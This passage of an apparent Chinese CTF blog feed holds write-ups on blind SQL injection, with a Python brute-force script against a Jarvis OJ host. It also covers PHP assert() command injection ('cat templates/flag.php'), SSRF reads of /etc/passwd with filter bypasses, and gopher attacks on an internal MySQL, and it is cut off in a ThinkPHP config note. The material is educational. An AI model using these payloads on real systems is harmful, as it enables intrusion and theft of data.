src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dup0qxpqj30nc078q3a.jpg" alt=""></p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g228rzyp3oj30jl08uaa6.jpg" alt=""><br>尝试使用username=admin&amp;password=123456，页面返回密码错误<br>尝试使用username=user&amp;password=123456，页面返回用户名错误<br>那么就说明验证方式是采用的用户名和密码分步验证的。</p><p>使用username=admin’#&amp;password=123456,页面返回密码错误，说明后台没有对#和’进行过滤。<br>使用username=admin’ or 1=1#&amp;password=123456，页面返回用户名错误，上面后台对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容有可能是or也有可能是空格。<br>使用username=user’/<strong>/or/</strong>/1=1#&amp;password=123456，页面返回密码错误，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。<br>总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了</p><p>查找表，<code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/ admin)#&amp;password=123456</code>,页面返回密码错误，那么就说明在数据库中存在admin表</p><p>查找字段<code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code>，页面返回密码错误，说明在admin表中存在username和password字段。</p><p>得到password长度，<code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分试探法，最终发现password的字段长度是32位，说明可能采用的是md5的方式来进行加密的</p><p>在确定了password的长度之后，接下来就是利用Python来进行爆破了。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">'xx'</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    username_template = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">    chars = <span class="string">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">char</span> <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(<span class="built_in">char</span>)</span><br><span class="line">            username = username_template.<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            payload[<span class="string">'username'</span>] = username</span><br><span class="line">            response = requests.post(url,data=payload)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            # <span class="built_in">print</span>(length)</span><br><span class="line">            #返回的长度只有<span class="number">1191</span>和<span class="number">1192</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">char</span>)</span><br><span class="line">                result += <span class="built_in">char</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p>得到密码的md5:334cfb59c9d74849801d5acdcfdaadc3<br>解md5后得:eTAloCrEP<br>登陆后得到flag:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2295ufy8jj30gd08daa6.jpg" alt=""></p><h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>XXE漏洞<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g229i9esgrj30sp0b6myc.jpg" alt=""></p><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>发现robots.txt 访问 <code>http://web.jarvisoj.com:32792/admin_s3cr3t.php</code><br>修改cookie 再次访问得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvx44lgnj30qa07hwf6.jpg" alt=""></p><h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>发现git文件泄漏，于是提取出来<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dw940lphj30ii05x3ys.jpg" alt=""><br>分析index. php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwds5jb4j30lr05lwet.jpg" alt=""><br>这里对page 进行了过滤<br>这里是assert()引起的代码注入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwu891jaj30k90dvmy0.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwvc0ez1j30o20exgox.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dx34uv4dj30yd0ie0ut.jpg" alt=""><br>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码<br>当page = flag’.system(“ls”).’<br>assert(“strpos(‘$file’, ‘..’) === false”)<br>拼接得到:assert(“strops(‘flag’.system(“ls”).’’,’..’) === false”)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dxi7c2x3j30qu07kmxh.jpg" alt=""><br>接下来构造<br>?page=’.system(‘cat templates/flag.php’).’<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dy8qcsjtj30vh08b0t9.jpg" alt=""><br>说明一下:assert与eval的区别<br>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</p><h1 id="dctf-inject"><a href="#dctf-inject" class="headerlink" title="dctf]inject"></a>dctf]inject</h1><h1 id="dctf-register"><a href="#dctf-register" class="headerlink" title="dctf]register"></a>dctf]register</h1><h1 id="babyphp-1"><a href="#babyphp-1" class="headerlink" title="babyphp"></a>babyphp</h1><h1 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h1>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSRF学习</title>
      <link href="/2019/03/24/SSRF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/24/SSRF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g165ua5y17j30nh0e53zv.jpg" alt=""></p><p>SSRF到反射XSS<br>尝试利用URL访问内部资源并使服务器执行操作<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">///</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">gopher:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>我们可以扫描内部网络和端口<br>如果它在云实例上运行，则尝试获取元数据</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">'url'</span>];</span><br><span class="line"><span class="variable">$info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="regexp">//</span>假设www.site.com为白名单网站</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$info</span>[<span class="string">'host'</span>] != <span class="string">'www.baidu.com'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">'目标网址不合法'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">echo <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><p>上面这段代码我们知道，主要是进行网址过滤，如果用户输入的网址不是公司的网址，则服务器不会发起请求。<br>这段代码的目的是，防止用户输入其它恶意数据，造成攻击，比如：<br><a href="http://www.site.com/test.php?url=http://10.0.0.16" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://10.0.0.16</a> –攻击者尝试内网漫游<br><a href="http://www.site.com/test.php?url=http://www.hack.com" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://www.hack.com</a> –攻击者引导服务器访问不合法网址<br>新人写代码往往对一些函数并不是了解很深入，这段代码忽视了两个问题：</p><ol><li>parse_url原理是什么？<br>parse_url只是负责字符串解析，它不保证你的协议真伪，这里我们不用http协议，而使用一个根本不存在的协议abc测试：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'http://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1alni59d8j30cd054746.jpg" alt=""><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'abc://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1aloes9ghj30dk04r3ye.jpg" alt=""></p><ol start="2"><li>curl支持哪些协议？<br>curl是基于libcurl实现的，支持的协议非常多。<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcurl supports HTTPS certificates, HTTP POST, HTTP PUT, FTP uploading, Kerberos, SPNEGO, HTTP form based upload, proxies, cookies, user+password authentication, file transfer resume, http<span class="built_in"> proxy </span>tunneling <span class="keyword">and</span> more</span><br></pre></td></tr></table></figure></li></ol><p>那么问题来了，我们回到最开始那个代码，我们可以发现存在两处问题：</p><ol><li>白名单只是检测了host，而没有检测协议。</li><li>curl除了支持http协议，还支持file协议。</li></ol><p><a href="http://www.site.com/test.php?url=file://www.site.com/etc/passwd" target="_blank" rel="noopener">http://www.site.com/test.php?url=file://www.site.com/etc/passwd</a></p><p>php curl识别出来这是个file协议，他会忽略<a href="http://www.site.com，而是直接读取文件/etc/passwd。" target="_blank" rel="noopener">www.site.com，而是直接读取文件/etc/passwd。</a></p><p>dict协议应用<br>dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在SSRF中如果可以使用dict协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>LCTF的一道SSRF签到题</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1al3w4pbaj30gy04lmxh.jpg" alt=""></p><p>输入baidu.com  返回了源码 可见是调用curl 命令</p><p>尝试用file 协议读取文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am35xhzsj30ia05mmxy.jpg" alt=""><br>后端代码会给我们提交的url内容在最后加一个／，需要通过？或者#的方法截断 需要进行url编码直接传#是会拼接成 /etc/passwd#/ 整体作为一个path<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am6i39etj30j105m76b.jpg" alt=""><br>接着读取 flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am85bx7bj30gf04laax.jpg" alt=""><br>随便读一下源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span><span class="keyword">if</span>(!$_GET[<span class="string">'site'</span>])&#123; <span class="keyword">echo</span> &lt;&lt;&lt;EOF &lt;html&gt; &lt;body&gt; look source code: &lt;form action=<span class="string">''</span> method=<span class="string">'GET'</span>&gt; &lt;input type=<span class="string">'submit'</span> name=<span class="string">'submit'</span> /&gt;&lt;input type=<span class="string">'text'</span> name=<span class="string">'site'</span> style=<span class="string">"width:1000px"</span> value=<span class="string">"https://www.baidu.com"</span>/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; <span class="keyword">die</span>(); &#125;</span></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'site'</span>]; $url_schema = parse_url($url);</span></span><br><span class="line"><span class="php">$host = $url_schema[<span class="string">'host'</span>];</span></span><br><span class="line"><span class="php">$request_url = $url.<span class="string">"/"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($host !== <span class="string">'www.baidu.com'</span>)&#123; <span class="keyword">die</span>(<span class="string">"wrong site"</span>); &#125;</span></span><br><span class="line"><span class="php">$ci = curl_init();</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_URL, $request_url);</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php"> $res = curl_exec($ci);</span></span><br><span class="line"><span class="php">curl_close($ci);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($res)&#123; <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Source Code:&lt;/h1&gt;"</span>; <span class="keyword">echo</span> $request_url; <span class="keyword">echo</span> <span class="string">"&lt;hr /&gt;"</span>; <span class="keyword">echo</span> htmlentities($res); &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">"get source failed"</span>; &#125; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>平安科技的一道CTF<br>看到有参数为url 猜测是一道SSRF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsq6l2jxj30j10740to.jpg" alt=""><br>尝试访问flag_file.php 弹出<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsrqdgtzj30hz04c3zf.jpg" alt=""><br>直接使用127.0.0.1 不行，可能做了关键字过滤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssc5zo6j30fw04c758.jpg" alt=""><br>把127.0.0.1转成整数或者localhost，成功拿到flag</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssxuyczj30g7041jsa.jpg" alt=""></p><p>第二届XCTF<br>Web400-百度内网漫游<br>题目给了一篇wooyun文章，通过查看得知是ssrf，随意在搜索框输入，返回百度的内容。<br>抓包，发现有一个link参数，根据ssrf的特性，确认此处存在ssrf漏洞。<br>于是我们要做的就是利用这个参数去访问其内网，但是经过测试发现，其过滤了IP，于是在自己的vps上放了一个302跳转：<br>利用跳转来访问内网<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btni4rg0j30zt0aewhm.jpg" alt=""><br>访问这个css文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btog0m5mj30ut0bqtel.jpg" alt=""><br>得到内网的域名,接下来访问这个内网域名<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btpefn7bj30uh0cfadp.jpg" alt=""><br>点了下导航栏下面的图片，直接给跳回去，但是发现地址栏多了一些东西，看到src，以及online几个参数，</p><h1 id="通过gopher发送post数据包"><a href="#通过gopher发送post数据包" class="headerlink" title="通过gopher发送post数据包"></a>通过gopher发送post数据包</h1><h1 id="通过gopher攻击内网数据库"><a href="#通过gopher攻击内网数据库" class="headerlink" title="通过gopher攻击内网数据库"></a>通过gopher攻击内网数据库</h1><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>2018  ISITDTU 的一道CTF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dh7bspwj30ki048t8j.jpg" alt=""></p><p>能够看出来是一道SSRF<br>于是利用file:// 读一下文件 输入file:///etc/passwd<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dir17yuj30p405ct90.jpg" alt=""><br>可以看到后台判断了服务器是否为localhost，所以我们通过file://localhost/etc/passwd即可绕过限制。这里我们尝试读题目源码file://localhost/var/www/html/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $content_url = getUrlContent($url);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content_url = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>再读一下config.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$hosts = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$dbusername = <span class="string">"ssrf_user"</span>;</span></span><br><span class="line"><span class="php">$dbpasswd = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"ssrf"</span>;</span></span><br><span class="line"><span class="php">$dbport = <span class="number">3306</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $tmpurl = parse_url($url, PHP_URL_HOST);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        var_dump($tmpurl);</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $url;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $url = safe($url);</span></span><br><span class="line"><span class="php">    $url = escapeshellarg($url);</span></span><br><span class="line"><span class="php">    $pl = <span class="string">"curl "</span>.$url;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $pl;</span></span><br><span class="line"><span class="php">    $content = shell_exec($pl);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $content;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">initdb($conn);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>在数据库中且给出了我们一个空密码的mysql账户<br>gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。</p><p>帮助生成gopher攻击mysql的payload</p><p><a href="https://github.com/style-404/mysql_gopher_attack" target="_blank" rel="noopener">https://github.com/style-404/mysql_gopher_attack</a></p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>2016Hctf的一道题</p><p>hackme上一道的一道XSS加ssrf</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/4420#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4420#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>thinnkphp学习</title>
      <link href="/2019/03/23/thinnkphp%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/23/thinnkphp%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>#安装与配置</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我们现在开始学习ThinkPHP第一步：设置ThinkPHP。一个框架的原始模样可能无法满足你的开发需求，但你可以通过设置来满足。在学习ThinkPHP的配置的时候，首先要明白：ThinkPHP框架中所有配置文件的定义格式都是采用返回PHP数组的方式来定义的。</p><p>我们最常操作的是应用配置，默认的就是在Application/Common/Conf/config.php文件中：<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">return <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="symbol">'URL_ROUTE_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'blogs</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Index</span>/read'),</span><br><span class="line">    <span class="symbol">'article</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Article</span>/show')</span><br><span class="line">),</span><br><span class="line">    <span class="symbol">'URL_MAP_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/top' =&gt; <span class="symbol">'Index</span>/top?<span 